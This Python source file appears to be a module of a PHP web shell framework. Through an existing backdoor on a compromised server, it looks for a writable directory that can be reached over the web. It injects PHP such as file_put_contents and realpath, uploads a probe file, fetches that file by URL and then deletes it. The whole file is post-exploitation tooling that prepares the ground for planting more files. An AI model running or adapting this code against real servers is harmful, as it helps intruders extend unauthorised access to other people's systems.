'''
Created on 28/ago/2011

@author: norby
'''

from core.moduleprobe import ModuleProbe
from core.moduleexception import ModuleException
from core.vector import VectorList, Vector as V
from random import choice
from string import letters
from core.http.request import Request
from urlparse import urlparse
from core.savedargparse import SavedArgumentParser as ArgumentParser

classname = 'Webdir'

def join_abs_paths(paths,sep = '/'):
    return sep.join([p.strip(sep) for p in paths])

class Webdir(ModuleProbe):
    """Find first web accessible writable directory"""


    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('-rpath', help='Remote starting path', default ='.')

    vectors = VectorList([
        V('system.info', 'base_dir', 'document_root' ),
        V('system.info', 'start_dir', 'basedir' ),
        V('system.info', 'dir_sep', 'dir_sep' ),
        V('shell.php', 'normalize', 'print(realpath("$path"));'),
        V('find.perms', 'find_writable_dirs', '-type d -writable $path'.split(' ')),
        V('shell.php', 'upload', "file_put_contents('$path', '1');"), # TODO: replace with file.upload
        V('file.rm', 'remove', '$path'),
    ])

    def _init_module(self):

        self.probe_filename = ''.join(choice(letters) for i in xrange(4)) + '.html'

    def _prepare_probe(self):
        self.found_url = None
        self.found_dir = None



    def _probe(self):
  
        base_dir = None

        # Get base dir to remove it and get absolute path
        base_dir = self.vectors.get('base_dir').execute(self.modhandler)

        # Where to start to find (usually current dir)
        if self.args['rpath'] == '.':
            start_path_to_normalize = self.vectors.get('start_dir').execute(self.modhandler)
        else:
            start_path_to_normalize = self.args['rpath']   

        # Normalize start path
        start_path = self.vectors.get('normalize').execute(self.modhandler, { 'path' : start_path_to_normalize })

        http_root = '%s://%s/' % (urlparse(self.modhandler.url).scheme, urlparse(self.modhandler.url).netloc)

        
        if not start_path or not base_dir:
            return

        
        writable_dirs = self.vectors.get('find_writable_dirs').execute(self.modhandler, {'path' : start_path}, stringify=False)
        writable_dirs.append(start_path)

        for dir_path in writable_dirs:

            sep = '/'

            file_path = sep + join_abs_paths([dir_path, self.probe_filename], sep)
            file_url = join_abs_paths([http_root, file_path.replace(base_dir,'')], sep)
            dir_url = join_abs_paths([http_root, dir_path.replace(base_dir,'')], sep)
            

            # Upload file with 1 inside
            self.vectors.get('upload').execute(self.modhandler, {'path' : file_path})
            
            # Check file reachability though url
            file_content = Request(file_url).read()
            if( file_content == '1'):
                self.found_dir = dir_path
                self.found_url = dir_url
            
            # Remove file
            self.vectors.get('remove').execute(self.modhandler, {'path' : file_path})

            if self.found_dir and self.found_url:
               self._output = [self.found_dir, self.found_url]
               return 

        raise ModuleException(self.name,  "Writable web directory not found")
    